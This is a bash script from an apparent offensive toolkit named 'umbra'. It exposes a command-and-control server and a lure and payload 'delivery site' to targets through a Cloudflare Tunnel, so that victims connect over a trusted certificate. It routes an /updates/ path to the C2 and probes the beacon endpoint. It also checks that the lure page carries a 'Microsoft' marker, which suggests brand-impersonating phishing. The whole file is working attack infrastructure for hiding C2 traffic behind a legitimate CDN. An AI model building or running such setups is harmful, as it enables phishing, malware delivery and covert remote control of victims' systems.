#!/usr/bin/env bash
# cf_tunnel.sh - publish the umbra origin through a Cloudflare Tunnel so the
# target talks to https://<DOMAIN> (implicit 443) with a public, browser-trusted
# Cloudflare certificate, even though the Kali box only has a private LAN IP.
#
# Why a tunnel and not a plain DNS record: every Cloudflare edge certificate is
# only trusted when the traffic actually goes through Cloudflare's edge. A LAN IP
# (192.168.x.x) cannot be reached by the edge and cannot get a public
# certificate of its own, so the tunnel is what makes "the Cloudflare HTTPS
# certificate" work with a private origin.
#
# One tunnel carries both backends, split by path:
#   /updates/...  -> the C2 (https://127.0.0.1:<C2_PORT>, self-signed, verify off)
#   everything else -> the static delivery site (http://127.0.0.1:<HTTP_PORT>)
#
# The two origin ports are NOT hard-coded here: they are derived from the shared
# scripts/umbra.env (HTTP_PORT / C2_BIND / C2_PORT) so they always match what
# serve.sh and the C2 actually bind. Getting those two out of sync is exactly
# what makes the domain serve the wrong app or refuse connections.
#
# First run (locally-managed tunnel). One-time, interactive:
#   cloudflared tunnel login          # opens a browser / prints a URL; pick the
#                                     # example.com zone
# Then, for every session:
#   cp scripts/umbra.env.example scripts/umbra.env   # once; set HTTP_PORT etc.
#   bash scripts/serve.sh &           # static origin on 127.0.0.1:<HTTP_PORT>
#   ./dist/server -listen 127.0.0.1:8443 -pass '<PASS>' -certdir dist/c2data
#   bash scripts/cf_tunnel.sh         # create (once) + run the tunnel
#
# Env (all optional; normally left to scripts/umbra.env):
#   DOMAIN        public hostname                  (default c2.example.com)
#   TUNNEL_NAME   tunnel name                      (default umbra)
#   HTTP_PORT     static origin port               (default 8080)
#   C2_BIND/C2_PORT  C2 bind address/port          (default 127.0.0.1 / 8443)
#   ORIGIN_HTTP   static origin URL  (default http://127.0.0.1:$HTTP_PORT)
#   ORIGIN_C2     C2 origin URL      (default https://$C2_BIND:$C2_PORT)
#   C2_PREFIX     path prefix routed to the C2     (default /updates/)
#   CF_DIR        cloudflared config dir           (default ~/.cloudflared)
#   FORCE=1       skip the origin pre-flight checks
#   TUNNEL_TOKEN  if set, run a remotely-managed tunnel from the Zero Trust
#                 dashboard instead of the local named tunnel (no cert.pem needed)
set -euo pipefail
cd "$(dirname "$0")/.."

# --- shared session config (single source of truth) --------------------------
load_env() {
  local f="$1" line k v
  [ -f "$f" ] || return 0
  while IFS= read -r line || [ -n "$line" ]; do
    case "$line" in ''|'#'*) continue ;; esac
    k="${line%%=*}"; v="${line#*=}"
    k="$(printf '%s' "$k" | tr -d '[:space:]')"
    [ -n "$k" ] || continue
    [ -n "${!k:-}" ] && continue
    case "$v" in
      \"*\") v="${v#\"}"; v="${v%\"}" ;;
      \'*\') v="${v#\'}"; v="${v%\'}" ;;
    esac
    export "$k=$v"
  done < "$f"
}
load_env scripts/umbra.env

DOMAIN="${DOMAIN:-c2.example.com}"
TUNNEL_NAME="${TUNNEL_NAME:-umbra}"
HTTP_PORT="${HTTP_PORT:-8080}"
C2_BIND="${C2_BIND:-127.0.0.1}"
C2_PORT="${C2_PORT:-8443}"
C2_PREFIX="${C2_PREFIX:-/updates/}"
ORIGIN_HTTP="${ORIGIN_HTTP:-http://127.0.0.1:$HTTP_PORT}"
ORIGIN_C2="${ORIGIN_C2:-https://$C2_BIND:$C2_PORT}"
CF_DIR="${CF_DIR:-$HOME/.cloudflared}"
CONF="${CONF:-$CF_DIR/config.yml}"

log() { printf '[*] %s\n' "$*"; }
ok()  { printf '[+] %s\n' "$*"; }
die() { printf '[-] %s\n' "$*" >&2; exit 1; }

# --- pre-flight: is the origin serving OUR app, on the port we think? ---------
# The tunnel is path-based and has a catch-all, so if HTTP_PORT happens to be
# occupied by a *different* app (code-server, a stale server, ...) the public
# site silently becomes that other app. We fetch the index and look for a marker
# that only the umbra lure page (smuggle or fallback) contains.
STAGE_MARKER="Microsoft"

preflight_http() {
  command -v curl >/dev/null 2>&1 || { log "curl not found - skipping static-origin pre-flight"; return 0; }
  local body
  if ! body="$(curl -fsS --max-time 8 "$ORIGIN_HTTP/" 2>/dev/null)"; then
    die "static origin $ORIGIN_HTTP is not answering.
    Start it in another terminal:  bash scripts/serve.sh
    (serve.sh binds HTTP_PORT=${HTTP_PORT} from scripts/umbra.env)
    To publish anyway, re-run with FORCE=1."
  fi
  # NOTE: do NOT use `printf ... | grep -q` here. The delivery page is several
  # MB; grep -q exits on the first match and closes the pipe, printf then dies of
  # SIGPIPE (exit 141) and `set -o pipefail` promotes that to a pipeline failure -
  # a false negative. Parameter expansion matches in-process with no pipe.
  case "$body" in
    *"$STAGE_MARKER"*) : ;;
    *) die "port ${HTTP_PORT} answers, but it is NOT the umbra delivery site:
    it does not contain the marker '$STAGE_MARKER'.
    Something else is bound there (code-server on 8080 is the usual culprit).
    Stop it, or set a free HTTP_PORT in scripts/umbra.env - serve.sh and this
    tunnel both read that one value, so they cannot drift apart.
    To publish anyway, re-run with FORCE=1."
    ;;
  esac
  ok "static origin $ORIGIN_HTTP serves the umbra delivery site"
}

preflight_c2() {
  command -v curl >/dev/null 2>&1 || return 0
  local code
  # A POST with an empty body reaches the C2 handler and is rejected with 401
  # ("unauthorized"). Anything else means the path is not hitting the C2:
  #   501 -> it fell through to the static python server
  #   404 -> the tunnel is not routing /updates/ to the C2 at all
  #   000 -> nothing is listening on the C2 port yet
  code="$(curl -sk -o /dev/null -w '%{http_code}' --max-time 8 -X POST -d '' \
    "${ORIGIN_C2}${C2_PREFIX}v2/sync" 2>/dev/null || echo 000)"
  case "$code" in
    401|400) ok "C2 origin $ORIGIN_C2 reachable (HTTP $code)" ;;
    000) log "warning: C2 at $ORIGIN_C2 is not listening yet - start it in another terminal:"
         log "         ./dist/server -listen ${C2_BIND}:${C2_PORT} -pass '<PASS>' -certdir dist/c2data" ;;
    *)   log "warning: C2 path replied HTTP $code at $ORIGIN_C2 (expected 401)" ;;
  esac
}

if [ "${FORCE:-}" = "1" ]; then
  log "FORCE=1 - skipping origin pre-flight checks"
elif [ -n "${TUNNEL_TOKEN:-}" ]; then
  log "TUNNEL_TOKEN set - skipping origin pre-flight (routes live in the dashboard)"
else
  preflight_http
  preflight_c2
fi

# --- install cloudflared if missing -------------------------------------------
if ! command -v cloudflared >/dev/null 2>&1; then
  log "cloudflared not found; installing from the Cloudflare release channel"
  case "$(uname -m)" in
    x86_64|amd64) deb="cloudflared-linux-amd64.deb" ;;
    aarch64|arm64) deb="cloudflared-linux-arm64.deb" ;;
    *) die "unsupported architecture: $(uname -m)" ;;
  esac
  url="https://github.com/cloudflare/cloudflared/releases/latest/download/$deb"
  tmp="$(mktemp -d)"
  trap 'rm -rf "$tmp"' EXIT
  if command -v curl >/dev/null 2>&1; then
    curl -fL -o "$tmp/$deb" "$url"
  else
    wget -O "$tmp/$deb" "$url"
  fi
  sudo dpkg -i "$tmp/$deb" || sudo apt-get -f install -y
  command -v cloudflared >/dev/null 2>&1 || die "installation failed"
fi
ok "cloudflared: $(cloudflared --version 2>/dev/null | head -n1)"

# --- remotely-managed tunnel (token from the Zero Trust dashboard) ------------
if [ -n "${TUNNEL_TOKEN:-}" ]; then
  log "running remotely-managed tunnel (TUNNEL_TOKEN set); routing comes from the dashboard"
  exec cloudflared tunnel --no-autoupdate run --token "$TUNNEL_TOKEN"
fi

# --- locally-managed named tunnel ---------------------------------------------
mkdir -p "$CF_DIR"
if [ ! -f "$CF_DIR/cert.pem" ]; then
  die "no $CF_DIR/cert.pem found - run 'cloudflared tunnel login' once (it opens a browser or prints a URL)"
fi

if ! cloudflared tunnel list 2>/dev/null | awk 'NR>1 {print $2}' | grep -qx "$TUNNEL_NAME"; then
  log "creating tunnel '$TUNNEL_NAME'"
  cloudflared tunnel create "$TUNNEL_NAME"
fi

TUNNEL_ID="$(cloudflared tunnel list | awk -v n="$TUNNEL_NAME" 'NR>1 && $2==n {print $1; exit}')"
[ -n "$TUNNEL_ID" ] || die "could not resolve the tunnel id for '$TUNNEL_NAME'"
CREDS="$CF_DIR/$TUNNEL_ID.json"
[ -f "$CREDS" ] || die "credentials file not found: $CREDS"
ok "tunnel '$TUNNEL_NAME' id $TUNNEL_ID"

log "routing $DOMAIN -> tunnel (idempotent)"
cloudflared tunnel route dns "$TUNNEL_NAME" "$DOMAIN" || true

cat > "$CONF" <<EOF
# generated by scripts/cf_tunnel.sh from scripts/umbra.env
tunnel: $TUNNEL_ID
credentials-file: $CREDS
ingress:
  # C2: self-signed origin cert, so verification is disabled for this rule only.
  - hostname: $DOMAIN
    path: ^${C2_PREFIX}
    service: $ORIGIN_C2
    originRequest:
      noTLSVerify: true
  # Everything else -> the static delivery site (lure page, payload, stagers...).
  - hostname: $DOMAIN
    service: $ORIGIN_HTTP
  - service: http_status:404
EOF
ok "wrote $CONF (static -> $ORIGIN_HTTP, c2 -> $ORIGIN_C2)"

# NOTE: the global --config flag must precede the subcommand in cloudflared
# (e.g. 2026.9.x): 'tunnel [--config FILEPATH] ingress validate'. Putting it
# after 'ingress' makes the flag parser reject it with
# 'flag provided but not defined: -config'.
cloudflared tunnel --config "$CONF" ingress validate || true

log "starting the tunnel - the edge now serves https://$DOMAIN"
log "verify the PUBLIC edge (bypassing any local hosts override) with: bash scripts/verify.sh"
exec cloudflared tunnel --config "$CONF" --no-autoupdate run "$TUNNEL_NAME"
